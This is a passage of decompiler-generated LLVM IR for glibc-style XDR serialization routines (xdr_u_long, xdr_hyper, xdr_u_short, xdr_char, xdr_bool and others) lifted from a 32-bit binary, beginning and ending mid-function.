  %v3_8063dab = load i32, i32* %v2_8063dab, align 4
  %v5_8063db4 = inttoptr i32 %v3_8063dab to i32*
  %v6_8063db4 = load i32, i32* %v5_8063db4, align 4
  call void @__pseudo_call(i32 %v6_8063db4)
  %v1_8063db9 = icmp eq i32 %v3_8063dab, 0
  br i1 %v1_8063db9, label %dec_label_pc_8063dcb, label %dec_label_pc_8063dbd

dec_label_pc_8063dbd:                             ; preds = %dec_label_pc_8063da9
  %v2_8063dc1 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8063dc1 = inttoptr i32 %v2_8063dc1 to i16*
  br label %dec_label_pc_8063dcd

dec_label_pc_8063dcb:                             ; preds = %dec_label_pc_8063d83, %dec_label_pc_8063da9
  br label %dec_label_pc_8063dcd

dec_label_pc_8063dcd:                             ; preds = %dec_label_pc_8063d83, %dec_label_pc_8063dbd, %dec_label_pc_8063d8f, %dec_label_pc_8063dcb
  %v0_8063dd1 = phi i32 [ 1, %dec_label_pc_8063d83 ], [ 1, %dec_label_pc_8063dbd ], [ %v2_8063d9b, %dec_label_pc_8063d8f ], [ 0, %dec_label_pc_8063dcb ]
  %v2_8063dd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063dd0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8063dd1

; uselistorder directives
  uselistorder i32 %v2_8063d7a, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063dcd, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8063dcb, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8063dd2 = call i32 @__GI_xdr_long()
  ret i32 %v0_8063dd2
}

define i32 @xdr_u_long(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %tmp6, i32* @ecx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8063de3 = load i32, i32* %arg1, align 4
  %v9_8063de5 = icmp eq i32 %v2_8063de3, 1
  br i1 %v9_8063de5, label %dec_label_pc_8063df8, label %dec_label_pc_8063dea

dec_label_pc_8063dea:                             ; preds = %entry
  %v5_8063de5 = icmp eq i32 %v2_8063de3, 0
  br i1 %v5_8063de5, label %dec_label_pc_8063e19, label %dec_label_pc_8063dec

dec_label_pc_8063dec:                             ; preds = %dec_label_pc_8063dea
  %v9_8063df1 = icmp eq i32 %v2_8063de3, 2
  br i1 %v9_8063df1, label %dec_label_pc_8063e2a, label %dec_label_pc_8063e28

dec_label_pc_8063df8:                             ; preds = %entry
  %v1_8063dfa = add i32 %tmp6, 4
  %v2_8063dfa = inttoptr i32 %v1_8063dfa to i32*
  %v3_8063dfa = load i32, i32* %v2_8063dfa, align 4
  %v5_8063e03 = inttoptr i32 %v3_8063dfa to i32*
  %v6_8063e03 = load i32, i32* %v5_8063e03, align 4
  call void @__pseudo_call(i32 %v6_8063e03)
  %v1_8063e08 = icmp eq i32 %v3_8063dfa, 0
  br i1 %v1_8063e08, label %dec_label_pc_8063e28, label %dec_label_pc_8063e0c

dec_label_pc_8063e0c:                             ; preds = %dec_label_pc_8063df8
  %v1_8063e10 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8063e10 = inttoptr i32 %v1_8063e10 to i32*
  br label %dec_label_pc_8063e2a

dec_label_pc_8063e19:                             ; preds = %dec_label_pc_8063dea
  %v1_8063e1b = add i32 %tmp6, 4
  %v2_8063e1b = inttoptr i32 %v1_8063e1b to i32*
  %v3_8063e1b = load i32, i32* %v2_8063e1b, align 4
  %v5_8063e20 = add i32 %v3_8063e1b, 4
  %v6_8063e20 = inttoptr i32 %v5_8063e20 to i32*
  %v7_8063e20 = load i32, i32* %v6_8063e20, align 4
  call void @__pseudo_call(i32 %v7_8063e20)
  br label %dec_label_pc_8063e2a

dec_label_pc_8063e28:                             ; preds = %dec_label_pc_8063dec, %dec_label_pc_8063df8
  br label %dec_label_pc_8063e2a

dec_label_pc_8063e2a:                             ; preds = %dec_label_pc_8063dec, %dec_label_pc_8063e19, %dec_label_pc_8063e0c, %dec_label_pc_8063e28
  %v0_8063e2e = phi i32 [ 1, %dec_label_pc_8063dec ], [ %v3_8063e1b, %dec_label_pc_8063e19 ], [ 1, %dec_label_pc_8063e0c ], [ 0, %dec_label_pc_8063e28 ]
  %v2_8063e2d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063e2d, i32* @ebx, align 4
  ret i32 %v0_8063e2e

; uselistorder directives
  uselistorder i32 %v2_8063de3, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8063e2a, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8063e28, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v3_8063e2f = ptrtoint i32* %ulp to i32
  %v5_8063e2f = call i32 @xdr_u_long(i32* %xdrs, i32 %v3_8063e2f)
  ret i32 %v5_8063e2f
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8063e41 = inttoptr i32 %tmp7 to i32*
  %v2_8063e41 = load i32, i32* %v1_8063e41, align 4
  store i32 %v2_8063e41, i32* %eax.global-to-local, align 4
  %v1_8063e43 = icmp eq i32 %v2_8063e41, 0
  %v1_8063e45 = icmp eq i1 %v1_8063e43, false
  br i1 %v1_8063e45, label %dec_label_pc_8063e8c, label %dec_label_pc_8063e74

dec_label_pc_8063e74:                             ; preds = %entry
  %v1_8063e47 = add i32 %tmp6, 4
  %v2_8063e47 = inttoptr i32 %v1_8063e47 to i32*
  %v3_8063e47 = load i32, i32* %v2_8063e47, align 4
  store i32 %v3_8063e47, i32* %eax.global-to-local, align 4
  store i32 %v3_8063e47, i32* %stack_var_-12, align 4
  %v2_8063e54 = ashr i32 %v3_8063e47, 31
  store i32 %v2_8063e54, i32* %edx.global-to-local, align 4
  %v1_8063e57 = inttoptr i32 %tmp6 to i32*
  %v2_8063e57 = load i32, i32* %v1_8063e57, align 4
  store i32 %v2_8063e57, i32* %eax.global-to-local, align 4
  %v1_8063e5f = add i32 %tmp7, 4
  %v2_8063e5f = inttoptr i32 %v1_8063e5f to i32*
  %v3_8063e5f = load i32, i32* %v2_8063e5f, align 4
  store i32 %v3_8063e5f, i32* %edx.global-to-local, align 4
  %v2_8063e62 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8063e62, i32* %eax.global-to-local, align 4
  %v5_8063e68 = add i32 %v3_8063e5f, 4
  %v6_8063e68 = inttoptr i32 %v5_8063e68 to i32*
  %v7_8063e68 = load i32, i32* %v6_8063e68, align 4
  call void @__pseudo_call(i32 %v7_8063e68)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8063e74 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063e74, i32* %eax.global-to-local, align 4
  %v0_8063e7a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063e7a = add i32 %v0_8063e7a, 4
  %v2_8063e7a = inttoptr i32 %v1_8063e7a to i32*
  %v3_8063e7a = load i32, i32* %v2_8063e7a, align 4
  store i32 %v3_8063e7a, i32* %edx.global-to-local, align 4
  %v5_8063e7f = add i32 %v3_8063e7a, 4
  %v6_8063e7f = inttoptr i32 %v5_8063e7f to i32*
  %v7_8063e7f = load i32, i32* %v6_8063e7f, align 4
  call void @__pseudo_call(i32 %v7_8063e7f)
  %v4_8063e87 = and i32 %v2_8063e74, -256
  %v5_8063e87 = or i32 %v4_8063e87, 1
  br label %dec_label_pc_8063ee1

dec_label_pc_8063e8c:                             ; preds = %entry
  %v9_8063e8c = icmp eq i32 %v2_8063e41, 1
  %v1_8063e8f = icmp eq i1 %v9_8063e8c, false
  br i1 %v1_8063e8f, label %dec_label_pc_8063edb, label %dec_label_pc_8063e91

dec_label_pc_8063e91:                             ; preds = %dec_label_pc_8063e8c
  %v1_8063e93 = add i32 %tmp7, 4
  %v2_8063e93 = inttoptr i32 %v1_8063e93 to i32*
  %v3_8063e93 = load i32, i32* %v2_8063e93, align 4
  store i32 %v3_8063e93, i32* %eax.global-to-local, align 4
  %v2_8063e96 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8063e96, i32* %edx.global-to-local, align 4
  %v5_8063e9c = inttoptr i32 %v3_8063e93 to i32*
  %v6_8063e9c = load i32, i32* %v5_8063e9c, align 4
  call void @__pseudo_call(i32 %v6_8063e9c)
  %v1_8063ea1 = icmp eq i32 %v3_8063e93, 0
  br i1 %v1_8063ea1, label %dec_label_pc_8063ee6, label %dec_label_pc_8063eb9

dec_label_pc_8063eb9:                             ; preds = %dec_label_pc_8063e91
  %v2_8063ea5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063ea5, i32* %eax.global-to-local, align 4
  %v0_8063eab = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063eab = add i32 %v0_8063eab, 4
  %v2_8063eab = inttoptr i32 %v1_8063eab to i32*
  %v3_8063eab = load i32, i32* %v2_8063eab, align 4
  store i32 %v3_8063eab, i32* %edx.global-to-local, align 4
  %v5_8063eb0 = inttoptr i32 %v3_8063eab to i32*
  %v6_8063eb0 = load i32, i32* %v5_8063eb0, align 4
  call void @__pseudo_call(i32 %v6_8063eb0)
  %v3_8063eb9 = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8063ec5 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063ec5 = add i32 %v1_8063ec5, 4
  %v3_8063ec5 = inttoptr i32 %v2_8063ec5 to i32*
  store i32 %v3_8063eb9, i32* %v3_8063ec5, align 4
  %v0_8063ec8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8063ec8 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063ec8 = inttoptr i32 %v1_8063ec8 to i32*
  store i32 %v0_8063ec8, i32* %v2_8063ec8, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8063ed3 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063ed3 = inttoptr i32 %v0_8063ed3 to i32*
  %v2_8063ed3 = load i32, i32* %v1_8063ed3, align 4
  %v4_8063ed3 = or i32 %v2_8063ed3, %tmp
  store i32 %v4_8063ed3, i32* %v1_8063ed3, align 4
  %v0_8063eeb.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063ee8

dec_label_pc_8063edb:                             ; preds = %dec_label_pc_8063e8c
  %v9_8063edb = icmp eq i32 %v2_8063e41, 2
  %v1_8063ede = zext i1 %v9_8063edb to i32
  %v3_8063ede = and i32 %v2_8063e41, -256
  %v4_8063ede = or i32 %v1_8063ede, %v3_8063ede
  br label %dec_label_pc_8063ee1

dec_label_pc_8063ee1:                             ; preds = %dec_label_pc_8063e74, %dec_label_pc_8063edb
  %storemerge = phi i32 [ %v5_8063e87, %dec_label_pc_8063e74 ], [ %v4_8063ede, %dec_label_pc_8063edb ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8063ee1 = urem i32 %storemerge, 256
  store i32 %v1_8063ee1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063ee8

dec_label_pc_8063ee6:                             ; preds = %dec_label_pc_8063e91
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063ee8

dec_label_pc_8063ee8:                             ; preds = %dec_label_pc_8063ee1, %dec_label_pc_8063eb9, %dec_label_pc_8063ee6
  %v0_8063eeb = phi i32 [ %v1_8063ee1, %dec_label_pc_8063ee1 ], [ %v0_8063eeb.pre, %dec_label_pc_8063eb9 ], [ 0, %dec_label_pc_8063ee6 ]
  store i32 %v0_8063eeb, i32* %eax.global-to-local, align 4
  ret i32 %v0_8063eeb

; uselistorder directives
  uselistorder i32 %v0_8063eeb, { 1, 0 }
  uselistorder i32 %v1_8063ee1, { 1, 0 }
  uselistorder i32 %v2_8063e41, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_8063ee8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063ee1, { 1, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8063efd = inttoptr i32 %tmp7 to i32*
  %v2_8063efd = load i32, i32* %v1_8063efd, align 4
  store i32 %v2_8063efd, i32* %eax.global-to-local, align 4
  %v1_8063eff = icmp eq i32 %v2_8063efd, 0
  %v1_8063f01 = icmp eq i1 %v1_8063eff, false
  br i1 %v1_8063f01, label %dec_label_pc_8063f3f, label %dec_label_pc_8063f27

dec_label_pc_8063f27:                             ; preds = %entry
  %v1_8063f03 = add i32 %tmp6, 4
  %v2_8063f03 = inttoptr i32 %v1_8063f03 to i32*
  %v3_8063f03 = load i32, i32* %v2_8063f03, align 4
  store i32 %v3_8063f03, i32* %stack_var_-12, align 4
  %v2_8063f10 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8063f10, i32* %eax.global-to-local, align 4
  %v1_8063f16 = add i32 %tmp7, 4
  %v2_8063f16 = inttoptr i32 %v1_8063f16 to i32*
  %v3_8063f16 = load i32, i32* %v2_8063f16, align 4
  store i32 %v3_8063f16, i32* %edx.global-to-local, align 4
  %v5_8063f1b = add i32 %v3_8063f16, 4
  %v6_8063f1b = inttoptr i32 %v5_8063f1b to i32*
  %v7_8063f1b = load i32, i32* %v6_8063f1b, align 4
  call void @__pseudo_call(i32 %v7_8063f1b)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8063f27 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063f27, i32* %eax.global-to-local, align 4
  %v0_8063f2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063f2d = add i32 %v0_8063f2d, 4
  %v2_8063f2d = inttoptr i32 %v1_8063f2d to i32*
  %v3_8063f2d = load i32, i32* %v2_8063f2d, align 4
  store i32 %v3_8063f2d, i32* %edx.global-to-local, align 4
  %v5_8063f32 = add i32 %v3_8063f2d, 4
  %v6_8063f32 = inttoptr i32 %v5_8063f32 to i32*
  %v7_8063f32 = load i32, i32* %v6_8063f32, align 4
  call void @__pseudo_call(i32 %v7_8063f32)
  %v4_8063f3a = and i32 %v2_8063f27, -256
  %v5_8063f3a = or i32 %v4_8063f3a, 1
  br label %dec_label_pc_8063f95

dec_label_pc_8063f3f:                             ; preds = %entry
  %v9_8063f3f = icmp eq i32 %v2_8063efd, 1
  %v1_8063f42 = icmp eq i1 %v9_8063f3f, false
  br i1 %v1_8063f42, label %dec_label_pc_8063f8f, label %dec_label_pc_8063f6c

dec_label_pc_8063f6c:                             ; preds = %dec_label_pc_8063f3f
  %v2_8063f44 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8063f44, i32* %eax.global-to-local, align 4
  %v1_8063f4a = add i32 %tmp7, 4
  %v2_8063f4a = inttoptr i32 %v1_8063f4a to i32*
  %v3_8063f4a = load i32, i32* %v2_8063f4a, align 4
  store i32 %v3_8063f4a, i32* %edx.global-to-local, align 4
  %v5_8063f4f = inttoptr i32 %v3_8063f4a to i32*
  %v6_8063f4f = load i32, i32* %v5_8063f4f, align 4
  call void @__pseudo_call(i32 %v6_8063f4f)
  %v2_8063f58 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063f58, i32* %eax.global-to-local, align 4
  %v0_8063f5e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063f5e = add i32 %v0_8063f5e, 4
  %v2_8063f5e = inttoptr i32 %v1_8063f5e to i32*
  %v3_8063f5e = load i32, i32* %v2_8063f5e, align 4
  store i32 %v3_8063f5e, i32* %edx.global-to-local, align 4
  %v5_8063f63 = inttoptr i32 %v3_8063f5e to i32*
  %v6_8063f63 = load i32, i32* %v5_8063f63, align 4
  call void @__pseudo_call(i32 %v6_8063f63)
  %v3_8063f6c = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8063f79 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063f79 = add i32 %v1_8063f79, 4
  %v3_8063f79 = inttoptr i32 %v2_8063f79 to i32*
  store i32 %v3_8063f6c, i32* %v3_8063f79, align 4
  %v0_8063f7c = load i32, i32* %eax.global-to-local, align 4
  %v1_8063f7c = load i32, i32* %esi.global-to-local, align 4
  %v2_8063f7c = inttoptr i32 %v1_8063f7c to i32*
  store i32 %v0_8063f7c, i32* %v2_8063f7c, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8063f87 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063f87 = inttoptr i32 %v0_8063f87 to i32*
  %v2_8063f87 = load i32, i32* %v1_8063f87, align 4
  %v4_8063f87 = or i32 %v2_8063f87, %tmp
  store i32 %v4_8063f87, i32* %v1_8063f87, align 4
  %v0_8063f9f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063f9c

dec_label_pc_8063f8f:                             ; preds = %dec_label_pc_8063f3f
  %v9_8063f8f = icmp eq i32 %v2_8063efd, 2
  %v1_8063f92 = zext i1 %v9_8063f8f to i32
  %v3_8063f92 = and i32 %v2_8063efd, -256
  %v4_8063f92 = or i32 %v1_8063f92, %v3_8063f92
  br label %dec_label_pc_8063f95

dec_label_pc_8063f95:                             ; preds = %dec_label_pc_8063f27, %dec_label_pc_8063f8f
  %storemerge = phi i32 [ %v5_8063f3a, %dec_label_pc_8063f27 ], [ %v4_8063f92, %dec_label_pc_8063f8f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8063f95 = urem i32 %storemerge, 256
  store i32 %v1_8063f95, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063f9c

dec_label_pc_8063f9c:                             ; preds = %dec_label_pc_8063f95, %dec_label_pc_8063f6c
  %v0_8063f9f = phi i32 [ %v1_8063f95, %dec_label_pc_8063f95 ], [ %v0_8063f9f.pre, %dec_label_pc_8063f6c ]
  store i32 %v0_8063f9f, i32* %eax.global-to-local, align 4
  ret i32 %v0_8063f9f

; uselistorder directives
  uselistorder i32 %v0_8063f9f, { 1, 0 }
  uselistorder i32 %v1_8063f95, { 1, 0 }
  uselistorder i32 %v2_8063efd, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_8063f95, { 1, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_8063fa4 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_8063fa4
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_8063fa9 = call i32 @xdr_u_hyper()
  ret i32 %v0_8063fa9
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8063fba = load i32, i32* %arg1, align 4
  %v9_8063fbc = icmp eq i32 %v2_8063fba, 1
  br i1 %v9_8063fbc, label %dec_label_pc_8063fe9, label %dec_label_pc_8063fc1

dec_label_pc_8063fc1:                             ; preds = %entry
  %v5_8063fbc = icmp eq i32 %v2_8063fba, 0
  br i1 %v5_8063fbc, label %dec_label_pc_8063fcf, label %dec_label_pc_8063fc3

dec_label_pc_8063fc3:                             ; preds = %dec_label_pc_8063fc1
  store i32 1, i32* %eax.global-to-local, align 4
  %v9_8063fc8 = icmp eq i32 %v2_8063fba, 2
  br i1 %v9_8063fc8, label %dec_label_pc_806400d, label %dec_label_pc_806400b

dec_label_pc_8063fcf:                             ; preds = %dec_label_pc_8063fc1
  %v1_8063fcf = inttoptr i32 %arg2 to i16*
  %v2_8063fcf = load i16, i16* %v1_8063fcf, align 2
  %v3_8063fcf = zext i16 %v2_8063fcf to i32
  store i32 %v3_8063fcf, i32* %stack_var_-8, align 4
  %v2_8063fd6 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8063fd6, i32* %eax.global-to-local, align 4
  %v1_8063fdc = add i32 %tmp10, 4
  %v2_8063fdc = inttoptr i32 %v1_8063fdc to i32*
  %v3_8063fdc = load i32, i32* %v2_8063fdc, align 4
  %v5_8063fe1 = add i32 %v3_8063fdc, 4
  %v6_8063fe1 = inttoptr i32 %v5_8063fe1 to i32*
  %v7_8063fe1 = load i32, i32* %v6_8063fe1, align 4
  call void @__pseudo_call(i32 %v7_8063fe1)
  %v0_8064011.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806400d

dec_label_pc_8063fe9:                             ; preds = %entry
  %v2_8063fe9 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8063fe9, i32* %eax.global-to-local, align 4
  %v1_8063fef = add i32 %tmp10, 4
  %v2_8063fef = inttoptr i32 %v1_8063fef to i32*
  %v3_8063fef = load i32, i32* %v2_8063fef, align 4
  %v5_8063ff4 = inttoptr i32 %v3_8063fef to i32*
  %v6_8063ff4 = load i32, i32* %v5_8063ff4, align 4
  call void @__pseudo_call(i32 %v6_8063ff4)
  %v0_8063ff9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8063ff9 = icmp eq i32 %v0_8063ff9, 0
  br i1 %v1_8063ff9, label %dec_label_pc_806400b, label %dec_label_pc_8063ffd

dec_label_pc_8063ffd:                             ; preds = %dec_label_pc_8063fe9
  %v2_8064001 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8064001 = inttoptr i32 %v2_8064001 to i16*
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806400d

dec_label_pc_806400b:                             ; preds = %dec_label_pc_8063fc3, %dec_label_pc_8063fe9
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806400d

dec_label_pc_806400d:                             ; preds = %dec_label_pc_8063fc3, %dec_label_pc_8063ffd, %dec_label_pc_8063fcf, %dec_label_pc_806400b
  %v0_8064011 = phi i32 [ 1, %dec_label_pc_8063fc3 ], [ 1, %dec_label_pc_8063ffd ], [ %v0_8064011.pre, %dec_label_pc_8063fcf ], [ 0, %dec_label_pc_806400b ]
  %v2_8064010 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8064010, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8064011

; uselistorder directives
  uselistorder i32 %v2_8063fba, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_806400d, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_806400b, { 1, 0 }
}

define i32 @xdr_char(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8064012 = load i32, i32* @ebx, align 4
  store i32 %v0_8064012, i32* %stack_var_-4, align 4
  %v4_8064016 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8064016, i32* %ebx.global-to-local, align 4
  %v2_806401a = load i8, i8* %arg2, align 1
  store i8 %v2_806401a, i8* %stack_var_-8, align 1
  %v2_8064021 = ptrtoint i8* %stack_var_-8 to i32
  %v2_806402a = call i32 @__GI_xdr_int(i32 %arg1, i32 %v2_8064021)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064034 = icmp eq i32 %v2_806402a, 0
  br i1 %v1_8064034, label %dec_label_pc_8064040, label %dec_label_pc_8064038

dec_label_pc_8064038:                             ; preds = %entry
  %v3_8064038 = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_806403e = load i32, i32* %ebx.global-to-local, align 4
  %v3_806403e = inttoptr i32 %v2_806403e to i8*
  store i8 %v3_8064038, i8* %v3_806403e, align 1
  %v0_8064040.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064040

dec_label_pc_8064040:                             ; preds = %entry, %dec_label_pc_8064038
  %v0_8064040 = phi i32 [ 0, %entry ], [ %v0_8064040.pre, %dec_label_pc_8064038 ]
  %v2_8064045 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8064045, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8064040

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8064040, { 1, 0 }
}

define i32 @xdr_u_char(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i8, align 1
  %v2_806404f = load i8, i8* %tmp7, align 1
  store i8 %v2_806404f, i8* %stack_var_-8, align 1
  %v2_8064056 = ptrtoint i8* %stack_var_-8 to i32
  store i32 %v2_8064056, i32* @eax, align 4
  %v5_806405f = call i32 @xdr_u_long(i32* %arg1, i32 %v2_8064056)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064069 = icmp eq i32 %v5_806405f, 0
  br i1 %v1_8064069, label %dec_label_pc_8064075, label %dec_label_pc_806406d

dec_label_pc_806406d:                             ; preds = %entry
  %v3_806406d = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8064073 = load i32, i32* @ebx, align 4
  %v3_8064073 = inttoptr i32 %v2_8064073 to i8*
  store i8 %v3_806406d, i8* %v3_8064073, align 1
  %v0_8064075.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064075

dec_label_pc_8064075:                             ; preds = %entry, %dec_label_pc_806406d
  %v0_8064075 = phi i32 [ 0, %entry ], [ %v0_8064075.pre, %dec_label_pc_806406d ]
  ret i32 %v0_8064075

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064075, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8064088 = load i32, i32* %arg1, align 4
  %v9_806408a = icmp eq i32 %v2_8064088, 1
  br i1 %v9_806408a, label %dec_label_pc_80640bc, label %dec_label_pc_806408f

dec_label_pc_806408f:                             ; preds = %entry
  %v5_806408a = icmp eq i32 %v2_8064088, 0
  br i1 %v5_806408a, label %dec_label_pc_806409d, label %dec_label_pc_8064091

dec_label_pc_8064091:                             ; preds = %dec_label_pc_806408f
  %v9_8064096 = icmp eq i32 %v2_8064088, 2
  br i1 %v9_8064096, label %dec_label_pc_80640e5, label %dec_label_pc_80640e3

dec_label_pc_806409d:                             ; preds = %dec_label_pc_806408f
  %v1_806409f = inttoptr i32 %arg2 to i32*
  %v2_806409f = load i32, i32* %v1_806409f, align 4
  %v3_806409f = icmp eq i32 %v2_806409f, 0
  %v1_80640a2 = icmp eq i1 %v3_806409f, false
  %v2_80640a2 = zext i1 %v1_80640a2 to i32
  store i32 %v2_80640a2, i32* %stack_var_-8, align 4
  %v1_80640ab = add i32 %tmp6, 4
  %v2_80640ab = inttoptr i32 %v1_80640ab to i32*
  %v3_80640ab = load i32, i32* %v2_80640ab, align 4
  %v2_80640ae = ptrtoint i32* %stack_var_-8 to i32
  %v5_80640b4 = add i32 %v3_80640ab, 4
  %v6_80640b4 = inttoptr i32 %v5_80640b4 to i32*
  %v7_80640b4 = load i32, i32* %v6_80640b4, align 4
  call void @__pseudo_call(i32 %v7_80640b4)
  br label %dec_label_pc_80640e5

dec_label_pc_80640bc:                             ; preds = %entry
  %v1_80640be = add i32 %tmp6, 4
  %v2_80640be = inttoptr i32 %v1_80640be to i32*
  %v3_80640be = load i32, i32* %v2_80640be, align 4
  %v5_80640c7 = inttoptr i32 %v3_80640be to i32*
